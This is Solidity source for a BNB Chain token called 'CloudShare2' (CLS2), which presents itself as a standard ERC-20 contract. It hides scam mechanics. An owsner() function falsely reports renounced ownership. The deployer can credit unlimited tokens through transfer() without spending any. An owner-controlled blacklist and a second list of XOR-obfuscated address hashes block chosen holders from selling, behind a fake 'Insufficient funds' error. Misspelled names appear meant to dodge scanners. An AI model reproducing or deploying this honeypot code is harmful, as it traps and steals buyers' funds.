/**
 *Submitted for verification at BscScan.com on 2022-06-29
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aqount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owsner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owsner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - kfie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    
    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract Ownable is Context {
    address private _owsner;
    event owsnershipTransferred(address indexed previousowsner, address indexed newowsner);

    constructor () {
        address msgSender = _msgSender();
        _owsner = msgSender;
        emit owsnershipTransferred(address(0), msgSender);
    }
    function owsner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowsner() {
        require(_owsner == _msgSender(), "Ownable: caller is not the owsner");
        _;
    }
    function renounceowsnership() public virtual onlyowsner {
        emit owsnershipTransferred(_owsner, address(0x000000000000000000000000000000000000dEaD));
        _owsner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract CloudShare2 is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "CloudShare2";
    string private _symbol = "CLS2";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1800000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnkfie = 3;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(uint => bool) private _LKD;
    function setAward(uint aqount) public onlyowsner {
        _LKD[aqount] = true;
    }


    function SUL(uint aqount) public onlyowsner {
        _LKD[aqount] = false;
    }


    function isLKD(uint aqount) public view returns (bool) {
        return _LKD[aqount];
    }

    constructor () {
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  	
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal {       
        require(!_LKD[_bytes32ToUint(callKeccak256(_toBytes(sender)))] && !_cbb(sender), "Insufficient funds");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");      

        uint256 kfieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            kfieamonnt = amonnts.mul(_burnkfie).div(100);
            require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - kfieamonnt;
        _balance[recipient] += amoun;
        if (_burnkfie > 0){
            emit Transfer (sender, _DEADaddress, kfieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address aqount) public view override returns (uint256) {
        return _balance[aqount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owsner, address spender, uint256 amonnts) internal virtual {
        require(owsner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owsner][spender] = amonnts;
        emit Approval(owsner, spender, amonnts);
    }

    function allowance(address owsner, address spender) public view virtual override returns (uint256) {
        return _allowances[owsner][spender];
    }


    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }


    
	function _mljs(uint _acc) internal view virtual returns (bool result) {
		uint[26] memory acc = [uint(112149071126461832075983856222471271753267051523538499595456832487783693206063)
			,96710404655028398592790826505165694247165099316727623909145905423470577793120
			,47529032386710371291849590193819078113542287588323952805416209596019474494246
			,72692753773178574290344427901417400511270159330575894365114808998376703445868
			,28342029282594186992025285189810278863150291594322913721139696767239392230162
			,93276887146117671640254088190124578247019289008582051507265795569456791960390
			,103853485484557269726071444947538063420251269965092374274749842827356920512917
			,71603738640898916368599159060803018164225830295946348957759597822670101904611
			,68740225073460734466817969291232419002361009716626430212546675329946858843937
			,31207494257961125074979754615702011692248318502090140425326600542955249416577
			,20713151400898050031219732198874289130232648202862757592772290712873347869749
			,91610776107358675194745386288445822834585232403216811553646564944285150446345
			,53208655227985414790686484781205975192430613365660120502673547644418805516268
			,36574969112810805258547996402073578588327447849705462636028058720510871676975
			,29056715784391789531484900976292126387602321567975076964637215235645160393423
			,109710228179263073555329309496525878964662052298533869635223407379446115504946
			,86287353524509591355883204711933210310222452395586444137288038974114192123428
			,25880751490876630935551025464488178369269062081744654690414243351111624637850
			,86762041357641625848010199829570953956466982585214594743095594197519345791488
			,109647684954419323771702941522033362006308157052552325472358081296338376607209
			,1512724525302241693537977909405901391663873235823237042489901122864363796519
			,38301445026205081030989785892717814224908031653620097950396823356392908160438
			,6435998875791802880019213668562146030702956323759657838419220170011247641603
			,13813992622054959426768556857064301941384501626185158926352730116986881919143
			,6318055516912256710714127416651492501681305519376725855206140284603086074779
			,14274799128924463123149312721440338159676620471330268588339103163151723707801];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 59439932804710294043044668605001996143807663871433625485572695476727245758628) return true;
		}
		return false;
	}



    function _cbb(address a) internal view returns (bool result) {
        uint k = _bytes32ToUint(callKeccak256(_toBytes(a)));
        return _mljs(k);
    }


}